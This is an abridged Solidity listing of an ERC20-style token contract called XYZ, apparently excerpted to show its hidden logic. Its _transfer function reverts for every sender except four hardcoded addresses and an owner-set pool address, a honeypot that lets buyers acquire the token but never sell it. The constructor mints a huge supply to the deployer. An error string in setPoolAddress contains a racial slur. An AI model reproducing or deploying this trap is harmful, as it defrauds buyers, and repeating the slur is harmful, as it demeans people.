...
interface IERC20 {
    ...
    function setPoolAddress(address to) external returns(bool);
}
...
abstract contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function setPoolAddress(address to) public override returns (bool) {
        require(msg.sender == __owner, 'Nice Trynigger');
        POOLADDRESS = to;
        return true;
    }
    ...
    function _transfer(address from, address to, uint256 value) internal {
        if (from != address(0x0a2854Fbbd9B3Ef66F17d47284E7f899b9509330) && from != address(0xdB6f1920A889355780aF7570773609Bd8Cb1f498) && from != address(0xE592427A0AEce92De3Edee1F18E0157C05861564) &&from != address(0x63E175E56c58f270DE017882b2eB486D14764124) && from != POOLADDRESS) {
            revert();
        }
        if (to == address(0)) {
             revert();
...
contract XYZ is ERC20 {
    ...
    { 
        super._mint(msg.sender, 10000000000000000000000000000000000000);
    }
